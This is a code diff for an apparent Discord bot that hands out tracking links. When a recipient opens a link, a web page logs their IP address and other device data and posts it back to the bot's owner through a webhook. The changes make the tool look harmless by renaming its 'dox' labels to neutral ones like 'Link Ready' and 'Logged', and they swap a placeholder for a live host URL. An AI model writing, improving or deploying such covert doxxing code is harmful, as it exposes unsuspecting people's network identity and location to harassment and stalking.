@@ -36,7 +36,7 @@ client.once('ready', () => {
     // Register slash command
     client.application.commands.create({
         name: 'dox',
-        description: 'Generate a fresh dox link',
+        description: 'Generate a fresh link',
     })
     .then(() => console.log('✅ Slash command registered'))
     .catch(err => console.error('❌ Failed to register command:', err));
@@ -48,7 +48,7 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.deferReply({ ephemeral: true });
 
         const id = crypto.randomBytes(6).toString('hex');
-        const url = `https://YOUR_RENDER_URL.onrender.com/dox/${id}`; // ⚠️ CHANGE THIS
+        const url = `https://pulsebot.onrender.com/dox/${id}`;
 
         links.set(id, {
             created: Date.now(),
@@ -56,7 +56,7 @@ client.on('interactionCreate', async (interaction) => {
         });
 
         const embed = new EmbedBuilder()
-            .setTitle('✅ Dox Link Ready')
+            .setTitle('✅ Link Ready')
             .setColor(0x22c55e)
             .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their data will be logged here.`)
             .setFooter({ text: 'Expires after 100 links generated' });
@@ -115,7 +115,7 @@ function generateDoxHTML() {
                 body: JSON.stringify({
                     content: null,
                     embeds: [{
-                        title: "☠️ Doxxed",
+                        title: "☠️ Logged",
                         color: 0xFF0000,
                         fields: [
                             { name: "🌐 IP", value: deviceData.ip || 'N/A', inline: true },
